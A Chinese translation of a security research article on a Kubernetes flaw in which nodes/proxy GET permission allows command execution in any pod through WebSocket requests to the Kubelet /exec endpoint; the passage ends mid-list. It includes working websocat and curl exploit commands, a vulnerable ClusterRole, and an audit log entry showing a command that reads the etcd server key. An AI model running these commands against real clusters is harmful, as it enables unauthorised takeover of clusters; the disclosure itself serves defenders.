#  K8s RCE 0-day漏洞剖析：仅需nodes/proxy GET权限即可接管集群  
Dubito
                    Dubito  云原生安全指北   2026-01-27 01:21  
  
   
  
> 注：本文翻译自  
GRAHAM HELTON[1]  
的文章  
《Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission》[2]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
  
全文如下：  
## 一、概述  
  
本文将介绍，当服务账户（service account）被授予 nodes/proxy GET  
 权限时，攻击者如何在多个 Kubernetes 集群中的所有 Pod 上执行代码。此问题最初通过 Kubernetes 安全披露流程报告，但被关闭并认定为“符合预期行为”。  
  
![在另一个 Pod 中执行命令](https://mmbiz.qpic.cn/sz_mmbiz_gif/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2ze4BYMy1QlAWt2FUC7o25eTVrxD8DTL498icFOHugrIxTa8Az0sXZ2A/640?from=appmsg "null")  
  
在另一个 Pod 中执行命令  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">属性</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">详情</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">存在风险的权限</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/proxy GET</span></code></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">测试的 Kubernetes 版本</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">v1.34, v1.35</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">所需的网络访问</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Kubelet API (端口 10250)</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">影响</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">可在任何可达节点（Node）上的任意 Pod 中执行代码</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">披露状态</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">不予修复（预期行为）</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: rgba(255, 143, 38, 1);font-weight: bold;"><span leaf="">受影响的 Helm Charts</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">69</span></section></td></tr></tbody></table>  
  
Kubernetes 管理员通常会授予服务账户对 nodes/proxy  
 资源的访问权限，以便其获取 Pod 指标（metrics）和容器日志等数据。因此，Kubernetes 监控工具普遍需要此权限来读取数据。  
  
当使用 WebSockets 等连接协议时，nodes/proxy GET  
 权限会导致命令执行。这是因为 Kubelet 仅根据初始 WebSocket 握手的请求做出授权决策，**而不会**  
 验证发起者是否拥有 Kubelet /exec  
 端点所需的 CREATE  
 权限。授权结果完全取决于连接协议。  
  
最终结果是：任何能够访问被授予 nodes/proxy GET  
 权限的服务账户，并且能够访问节点 Kubelet 端口 10250 的攻击者，都可以向 /exec  
 端点发送信息，**从而在任何 Pod（包括具有特权的系统 Pod）中执行命令**  
。这可能导致整个集群被攻陷。**Kubernetes AuditPolicy 不会记录通过直接连接 Kubelet API 执行的命令。**  
  
**这不是某个特定供应商（vendor）的问题。**  
 由于目前没有普遍可用的可行替代方案，供应商广泛使用 nodes/proxy GET  
 权限。快速搜索发现了 69 个提及 nodes/proxy GET  
 权限的 Helm Charts。其中一些 Charts 默认包含此权限，另一些则可能需要配置额外选项。如果您对此有疑虑，请咨询您的供应商并查看本文的检测部分。  
> **注意**  
  
有些 Charts 需要启用特定功能才会使用 nodes/proxy  
。例如，Cilium 必须配置使用 Spire。  
  
  
以下是其中一些值得注意的 Charts。本文附录部分列出了识别出的全部 69 个 Helm Charts：  
- •   
prometheus-community/prometheus[3]  
  
- •   
grafana/promtail[4]  
  
- •   
datadog/datadog[5]  
  
- •   
elastic/elastic-agent[6]  
  
- •   
cilium/cilium[7]  
  
- •   
opentelemetry-helm/opentelemetry-kube-stack[8]  
  
- •   
trivy-operator/trivy-operator[9]  
  
- •   
newrelic/newrelic-infrastructure[10]  
  
- •   
wiz-sec/sensor[11]  
  
以下 ClusterRole 展示了利用此漏洞所需的全部权限。  
```
# 存在漏洞的 ClusterRoleapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: nodes-proxy-readerrules:  - apiGroups: [""]    resources: ["nodes/proxy"]    verbs: ["get"]
```  
  
作为集群管理员，您可以使用   
此检测脚本[12]  
 来检查集群中所有服务账户是否拥有此权限。  
  
如果服务账户存在漏洞，攻击者可以使用类似 websocat  
 的工具，在集群的所有 Pod 中运行命令：  
```
websocat --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol v4.channel.k8s.io \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=id"uid=0(root) gid=0(root) groups=0(root)
```  
  
如果您想亲自动手尝试，我已经   
发布了一个实验环境，可以逐步演练在其他 Pod 中执行命令的过程[13]  
。  
  
![演示环境](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T299YNVCo8IicvpBXBeRZWV83O0yGBkicyUSwKAkfVfiakZWY2F984zytPQ/640?from=appmsg "null")  
  
演示环境  
## 二、技术解析：什么是 Nodes/Proxy？  
  
快速回顾：Kubernetes RBAC 使用资源（resources）和动词（verbs）来控制访问权限。像 pods  
、pods/exec  
 或 pods/logs  
 这样的资源对应着特定的操作，而像 get  
、create  
 或 delete  
 这样的动词则定义了允许执行的动作。例如，拥有 create  
 动词的 pods/exec  
 资源允许在 Pods 中执行命令，而拥有 get  
 动词的 pods/logs  
 资源则允许读取日志。  
  
nodes/proxy  
 资源则比较特殊。与大多数映射到特定操作（例如 pods/exec  
 用于命令执行，pods/logs  
 用于日志访问）的 Kubernetes 资源不同，nodes/proxy  
 是一个总括性权限，它控制对 Kubelet API 的访问。它通过授予对两个不同但又稍有关联的端点（称为 **API Server Proxy**  
 和 **Kubelet API**  
）的访问权限来实现这一点。  
## 三、API Server Proxy  
  
nodes/proxy  
 授权访问的第一个端点是 API Server 代理端点 $API_SERVER/api/v1/nodes/$NODE_NAME/proxy/...  
。  
  
发送到此端点的请求会从 API Server 代理到目标节点上的 Kubelet。这用于许多操作，其中一些常见的包括：  
- • 读取指标（metrics）：$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/metrics  
  
- • 读取资源使用情况：$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/stats/summary  
  
- • 获取容器日志：$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/containerLogs/$NAMESPACE/$POD_NAME/$CONTAINER_NAME  
  
这些操作可以直接使用 kubectl 的 --raw  
 标志或直接用 curl 来访问。例如，向指标（metrics）端点发送请求会返回一些基本的指标信息：  
```
# 使用 kubectlkubectl get --raw /api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10# 或使用 curlcurl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10
```  
```
# HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated# TYPE aggregator_discovery_aggregation_count_total counteraggregator_discovery_aggregation_count_total 0# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.# TYPE apiserver_audit_event_total counterapiserver_audit_event_total 0# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.# TYPE apiserver_audit_requests_rejected_total counterapiserver_audit_requests_rejected_total 0# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
```  
  
由于此请求经过 API Server，它会生成 pods/exec  
 和 subjectaccessreviews  
 资源的日志（如果已配置   
AuditPolicy[14]  
）。在记录的 pods/exec  
 请求中，请注意 requestURI  
 字段显示了正在 Pod 中执行的完整命令。  
```
// Request generated via AuditPolicy{  "kind": "Event",  "apiVersion": "audit.k8s.io/v1",  "level": "Metadata",  "auditID": "196f4d69-6cfa-4812-b7b9-4bf13689cb8d",  "stage": "RequestReceived",  "requestURI": "/api/v1/namespaces/kube-system/pods/etcd-minikube/exec?command=sh&command=-c&command=filename%3D%2Fvar%2Flib%2Fminikube%2Fcerts%2Fetcd%2Fserver.key%3B+while+IFS%3D+read+-r+line%3B+do+printf+%22%25s%5C%5Cn%22+%22%24line%22%3Bdone+%3C+%22%24filename%22&container=etcd&stdin=true&stdout=true&tty=true",  "verb": "get",  "user": {    "username": "minikube-user",    "groups": [      "system:masters",      "system:authenticated"    ],    "extra": {      "authentication.kubernetes.io/credential-id": [        "X509SHA256=3da792d1a94c5205821984a672707270a9f2d8e27190eb09051b15448e5bf0c3"      ]    }  },  "sourceIPs": [    "192.168.67.1"  ],  "userAgent": "kubectl/v1.31.0 (linux/amd64) kubernetes/9edcffc",  "objectRef": {    "resource": "pods",    "namespace": "kube-system",    "name": "etcd-minikube",    "apiVersion": "v1",    "subresource": "exec"  },  "requestReceivedTimestamp": "2025-11-04T05:42:51.025534Z",  "stageTimestamp": "2025-11-04T05:42:51.025534Z"}
```  
## 四、Kubelet API  
  
除了 API Server 代理端点，nodes/proxy  
 资源还授予了对 Kubelet API 的直接访问权限。请记住，每个节点（Node）都运行着一个 Kubelet 进程，它负责告知容器运行时（container runtime）创建哪些容器。  
  
Kubelet 暴露了多个 API 端点，这些端点提供的信息与 API Server 代理相似。例如，我们可以通过直接查询 Kubelet API 来获取与之前相同的指标数据。  
```
curl -sk -H "Authorization: Bearer $TOKEN" https://$NODE_IP:10250/metrics | head -n 10
```  
> **注意**  
  
我们必须使用节点的 IP 地址，而不是像在 API Server 请求中那样使用节点名称。  
  
```
# HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated# TYPE aggregator_discovery_aggregation_count_total counteraggregator_discovery_aggregation_count_total 0# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.# TYPE apiserver_audit_event_total counterapiserver_audit_event_total 0# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.# TYPE apiserver_audit_requests_rejected_total counterapiserver_audit_requests_rejected_total 0# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
```  
  
值得注意的是，这种直接连接到 Kubelet 的方式不会经过 API Server。这意味着 Kubernetes AuditPolicy 只会为检查操作授权而生成 subjectaccessreviews  
 日志，但**不会**  
记录 pods/exec  
 操作。这导致我们无法看到正在 Pod 中执行的完整命令。  
```
{  "kind": "Event",  "apiVersion": "audit.k8s.io/v1",  "level": "Metadata",  "auditID": "1be86af9-26e7-40e9-aaae-bbb904df129b",  "stage": "ResponseComplete",  "requestURI": "/apis/authorization.k8s.io/v1/subjectaccessreviews",  "verb": "create",  "user": {    "username": "system:node:minikube",    "groups": ["system:nodes", "system:authenticated"],    "extra": {      "authentication.kubernetes.io/credential-id": [        "X509SHA256=52d652baad2bfd4d1fa0bb82308980964f8c7fbf01784f30e096accd1691f889"      ]    }  },  "sourceIPs": ["192.168.67.2"],  "userAgent": "kubelet/v1.34.0 (linux/amd64) kubernetes/f28b4c9",  "objectRef": {    "resource": "subjectaccessreviews",    "apiGroup": "authorization.k8s.io",    "apiVersion": "v1"  },  "responseStatus": { "metadata": {}, "code": 201 },  "requestReceivedTimestamp": "2025-11-04T05:54:54.978676Z",  "stageTimestamp": "2025-11-04T05:54:54.979425Z",  "annotations": {    "authorization.k8s.io/decision": "allow",    "authorization.k8s.io/reason": ""  }}
```  
  
在撰写本文时，  
Kubelet 授权文档[15]  
并未完整列出 Kubelet 的 API 端点。Kubelet API 暴露了以下额外的端点：  
- • /exec  
：在容器中创建新进程并执行任意命令（交互式）  
  
- • /run  
：与 /exec  
 非常相似，在容器中运行命令并获取输出（非交互式）  
  
- • /attach  
：附加到容器进程，访问其标准输入/输出/错误流  
  
- • /portforward  
：创建网络隧道，将 TCP 连接转发到容器  
  
/exec  
 和 /run  
 端点将是我们的主要关注点。与 /metrics  
 和 /stats  
 等只读端点不同，/exec  
 和 /run  
 端点允许在容器内部执行代码。  
  
通常，在标准的 Kubernetes RBAC 语义中，诸如创建 Pod 或在 Pod 中执行代码这类操作需要 CREATE  
 这个 RBAC 动词，而读取操作则需要 GET  
 动词。这使得查看一个 (Cluster)Role 并判断其是否为只读权限变得非常容易。然而，正如 Rory McCune 在文章   
当只读权限不只读?[16]  
 中指出的，情况并非总是如此。  
  
nodes/proxy CREATE  
 权限众所周知是极其危险的，其风险已有多处文档记载：  
- •   
RBAC 最佳实践[17]  
  
- •   
API server 旁路风险[18]  
  
- •   
Kubernetes RBAC 中的 Node/Proxy[19]  
  
- •   
Kubernetes RBAC 中的权限提升[20]  
  
- •   
CIS Kubernetes 安全基准[21]  
  
就连 nccgroup 的安全审计也发现，当 nodes/proxy GET  
 与 nodes/status PATCH  
 或 nodes CREATE  
 权限结合使用时，会存在问题：  
  
![安全审计 - kubernetes/kubernetes#119270](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2KfiajUnNvQpf22kVtqyBT9cAjl6NLicmeqba59omQHG9zUVIEfyssWnQ/640?from=appmsg "null")  
  
安全审计 - kubernetes/kubernetes[#119270]()  
  
  
文档明确说明，对 Kubelet 和 API Server 代理路径的请求授权方式相同[22]  
：“Kubelet 使用与 apiserver 相同的请求属性方法来授权 API 请求”。  
  
当一个典型的请求发送到 API server 时，Kubernetes 会读取 HTTP 方法（GET  
、POST  
、PUT  
…）并将其转换为 RBAC“动词”，如 GET  
、CREATE  
、UPDATE  
。（  
auth.go:80-94[23]  
）  
  
Kubernetes 文档提供了以下 HTTP 动词到 RBAC 动词的映射关系：  
  
![HTTP 到 RBAC 动词映射](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2Ribq0n6EUiat9W3unzdvKe1Q19BkicceEVGHmRskgSTLwZ8M5IuILic7ibg/640?from=appmsg "null")  
  
HTTP 到 RBAC 动词映射  
  
这应该意味着 POST  
 请求始终映射到 RBAC CREATE  
 动词，而 GET  
 请求始终映射到 RBAC GET  
 动词，行为保持一致。然而，当通过非 HTTP 通信协议（如 WebSockets）访问 Kubelet 的 /exec  
 端点时（根据   
RFC 标准[24]  
，在初始握手阶段需要使用 HTTP GET  
 方法），**Kubelet 会根据这个初始的 GET 请求做出授权决策，而不是基于后续的实际命令执行操作**  
。其结果是，nodes/proxy GET  
 权限会错误地允许执行本应需要 nodes/proxy CREATE  
 权限的命令。  
## 五、理解该漏洞  
  
nodes/proxy  
 权限赋予服务账户访问 Kubelet API 的权限。正如我前面指出的，安全专家早已确认这可能带来问题。即便没有这个漏洞，对 Kubelet API 的读取权限也允许访问只读端点，例如 /metrics  
 和 /containerLogs  
。  
> **注意**  
  
我强烈建议检查这些端点是否泄露了密钥（secrets）或 API 密钥！  
  
  
然而，此问题揭示了一个更严重的问题：nodes/proxy GET  
 权限实际上授予了对命令执行端点的**写**  
访问权限。  
  
为了便于讨论，我将使用一个拥有以下 ClusterRole 的服务账户。  
```
apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: nodes-proxy-readerrules:  - apiGroups: [""]    resources: ["nodes/proxy"]    verbs: ["get"]
```  
### 5.1 根本原因  
  
如前所述，Kubelet 根据初始 HTTP 方法决定检查哪个 RBAC 动词。POST  
 请求映射到 RBAC CREATE  
 动词，而 GET  
 请求则映射到 RBAC GET  
 动词。  
  
这之所以有趣，是因为 Kubelet 上的命令执行端点（例如 /exec  
）使用 WebSockets 进行数据的双向流式传输。由于 HTTP 对于实时双向通信并不理想，交互式命令执行需要像 WebSockets 或 SPDY 这样的协议。  
  
值得注意的是，  
WebSocket 协议要求[24]  
在初始握手并升级到 WebSockets 时，发送一个包含 Connection: Upgrade  
 标头的 HTTP GET  
 请求。  
  
这意味着在任何 WebSocket 连接建立时，发送的初始请求都是一个带有 Connection: Upgrade  
 标头的 HTTP GET  
 请求：  
```
GET /exec HTTP/1.1Host: example.comUpgrade: websocketConnection: Upgrade<snip>
```  
  
正是由于在 WebSocket 连接期间发送的这个初始 GET  
 请求，Kubelet 错误地基于 WebSocket 连接建立过程中的这个初始 GET  
 请求来授权，而不是在连接建立后验证执行操作所需的实际权限。  
  
Kubelet 在连接请求升级后缺少了授权检查，并且从未验证使用 WebSockets 时，服务账户是否拥有执行实际操作的权限。  
  
这就使得攻击者可以利用 /exec  
 端点进行命令执行，而无需 CREATE  
 权限。只需使用像   
websocat[25]  
 这样的工具通过 WebSockets 发送请求即可。  
  
为了演示这一点，我们先检查我们的权限，以确保该服务账户只被分配了 nodes/proxy GET  
 权限。  
```
kubectl auth can-i --list
```  
```
Resources                                       Non-Resource URLs                      Resource Names   Verbsselfsubjectreviews.authentication.k8s.io        []                                     []               [create]selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]                                                [/.well-known/openid-configuration/]   []               [get]                                                [/.well-known/openid-configuration]    []               [get]                                                [/api/*]                               []               [get]                                                [/api]                                 []               [get]                                                [/apis/*]                              []               [get]                                                [/apis]                                []               [get]                                                [/healthz]                             []               [get]                                                [/healthz]                             []               [get]                                                [/livez]                               []               [get]                                                [/livez]                               []               [get]                                                [/openapi/*]                           []               [get]                                                [/openapi]                             []               [get]                                                [/openid/v1/jwks/]                     []               [get]                                                [/openid/v1/jwks]                      []               [get]                                                [/readyz]                              []               [get]                                                [/readyz]                              []               [get]                                                [/version/]                            []               [get]                                                [/version/]                            []               [get]                                                [/version]                             []               [get]                                                [/version]                             []               [get]nodes/proxy                                     []                                     []               [get]
```  
  
确认该服务账户仅拥有 nodes/proxy GET  
 权限后，我们可以使用   
websocat[25]  
 直接向 Kubelet 的 /exec  
 端点发送一个 WebSocket 请求。  
```
websocat \  --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol "v4.channel.k8s.io" \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=hostname"
```  
```
nginx{"metadata":{},"status":"Success"}
```  
  
结果显示 hostname  
 命令成功执行。**这就是漏洞所在。Kubelet 的授权逻辑将握手期间发送的 WebSocket HTTP GET 请求映射到了 RBAC GET 动词**  
。接着它检查 nodes/proxy GET  
 权限（我们拥有此权限），并允许操作继续进行。之后不存在二次授权检查来验证是否拥有执行此写入操作所需的 CREATE  
 动词！  
  
相反，如果使用 POST 请求（映射到 RBAC CREATE  
 动词）访问同一个 /exec  
 端点，请求则会被拒绝。  
```
curl -sk -X POST \  -H "Authorization: Bearer $TOKEN" \  "https://$NODE_IP:10250/exec/default/nginx/nginx?command=hostname&stdout=true&stderr=true"
```  
```
Forbidden (user=system:serviceaccount:default:attacker, verb=create, resource=nodes, subresource(s)=[proxy])
```  
  
正如预期的那样，这个请求被禁止了，因为我们的用户 system:serviceaccount:default:attacker  
 没有 nodes/proxy CREATE  
 权限，我们只有 nodes/proxy GET  
 权限。  
授权逻辑[23]  
 正确地将 HTTP POST  
 映射到了 RBAC CREATE  
 动词。  
  
这两个请求都针对 Kubelet 上同一个执行命令的 /exec  
 端点，但它们仅基于连接协议所需的初始 HTTP 方法，就使用了不同的 RBAC 动词进行授权。  
  
**授权决策应基于操作内容，而不是请求的传输方式。**  
 这使得攻击者可以通过选择不同的连接协议来绕过现有的授权控制。  
> **注意**  
  
为简单起见，本文主要关注 WebSockets，不过 Kubernetes 中也使用了 SPDY :)  
  
  
为了弄清楚为什么会发生这种情况，我最终不得不追踪代码库中的请求路径，以理解为何 nodes/proxy GET  
 请求能允许访问本应需要 nodes/proxy CREATE  
 权限的资源。以下是我发现的路径：  
1. 1. **客户端发起 WebSocket 连接**  
：客户端向 /exec/default/nginx/nginx?command=id  
 发送带有 Connection: Upgrade  
 标头的 HTTP GET 请求，以建立用于命令执行的 WebSocket 连接。例如，使用   
websocat[25]  
。  
  
1. 2. **身份验证**  
：Kubelet 验证请求中的 JWT Bearer 令牌，并提取用户身份。即：system:serviceaccount:default:attacker  
（  
server.go:338[26]  
）  
  
1. 3. **请求授权属性**  
：Kubelet 调用授权属性函数，传递经过身份验证的用户和 HTTP 请求，以确定需要检查哪些 RBAC 权限（  
server.go:350[27]  
）。  
  
1. 4. **将 HTTP 方法映射到 RBAC 动词**  
：Kubelet 检查请求方法 GET  
（WebSocket 协议   
RFC 6455[24]  
 所要求），并将其映射到 RBAC 动词 "get"  
（  
auth.go:87[28]  
）。  
  
> **注意**  
  
这是第一个缺陷。授权决策是基于 WebSocket 握手期间**必需的**  
 HTTP GET  
 方法做出的。  
  
1. 5. **将请求路径映射到子资源**  
：Kubelet 检查请求路径 /exec/default/nginx/nginx  
。它与特定的案例（/stats  
、/metrics  
、/logs  
、/checkpoint  
）不匹配，因此默认将其归为 proxy  
 子资源（  
auth.go:129[29]  
）。  
  
> **注意**  
  
这是第二个缺陷。/exec  
 端点（以及其他几个端点）未被列出，因此匹配了默认的 **proxy**  
 情况。  
  
1. 6. **构建授权属性**  
：Kubelet 构建一个授权记录，其中动词为 GET  
，资源为 nodes  
，子资源为 proxy  
。这就是它将与 RBAC 策略进行比对的依据（  
auth.go:136[30]  
）。  
  
这个记录可能看起来像这样：  
```
authorizer.AttributesRecord{    User:            system:serviceaccount:default:attacker,    Verb:            "get",    Namespace:       "",    APIGroup:        "",    APIVersion:      "v1",    Resource:        "nodes",    Subresource:     "proxy",    Name:            "minikube-m02",    ResourceRequest: true,    Path:            "/exec/default/nginx/nginx",}
```  
1. 7. **将属性返回给过滤器**  
：Kubelet 将构建好的授权记录返回给授权过滤器（  
auth.go:151[31]  
）。  
  
1. 8. **执行授权检查**  
：Kubelet 执行授权，通常通过 Webhook 查询 API server 的 RBAC 授权器：“用户 system:serviceaccount:default:attacker  
 能否在资源 nodes/proxy  
 上执行动词 get  
？”（  
server.go:356[32]  
）  
  
> **注意**  
subjectaccessreviews  
 日志就是在此步骤生成的。  
  
1. 9. **授权通过**  
：授权器返回允许决定，因为用户的 ClusterRole 授予了对 nodes/proxy  
 资源执行 ["get"]  
 动词的权限（  
server.go:365[33]  
）。  
  
> **注意**  
  
这是之前几个缺陷导致的结果。它将允许写入操作，尽管我们只拥有 RBAC **get**  
 动词。  
  
1. 10. **继续执行处理器**  
：由于授权成功，Kubelet 将请求传递给链中的下一个过滤器/处理器（  
server.go:384[34]  
）。  
  
1. 11. **路由到 exec 处理器**  
：该请求匹配到已注册的针对 GET 请求的 exec 端点路由，Kubelet 将其派遣给相应的处理器（  
server.go:968[35]  
）。  
  
> **注意**  
  
这里本应存在第二次授权检查，就像遵循 API Server 代理路径时所做的那样（  
authorize.go:31[36]  
）。  
  
1. 12. **查找 Pod**  
：Kubelet 在命名空间 default  
 中查找目标 Pod nginx  
（  
server.go:976[37]  
）。  
  
1. 13. **向容器运行时请求 exec URL**  
：Kubelet 向容器运行时接口请求一个流式 URL，用于在指定的 Pod 和容器中执行命令（  
server.go:983[38]  
）。  
  
1. 14. **容器运行时返回 URL**  
：CRI 返回一个流式端点 URL，可以在此建立 WebSocket 连接以执行命令。  
  
1. 15. **建立 WebSocket 流**  
：Kubelet 将 HTTP 连接升级为 WebSocket，并在客户端和容器运行时之间建立双向流式传输（  
server.go:988[39]  
）。  
  
1. 16. **在容器中执行命令**  
：容器运行时在 nginx 容器内执行命令 id  
。  
  
1. 17. **返回命令输出**  
：容器运行时通过 WebSocket 连接将命令输出 uid=0(root) gid=0(root) groups=0(root)  
 流式传回。  
  
1. 18. **流式传输给客户端**  
：Kubelet 将输出流代理回客户端，仅凭 nodes/proxy GET  
 权限就完成了命令执行。  
  
### 5.2 这说明了什么？  
  
代码分析揭示了两个独立的设计缺陷，它们共同导致了实际问题的产生。  
1. 1. **基于连接协议的授权**  
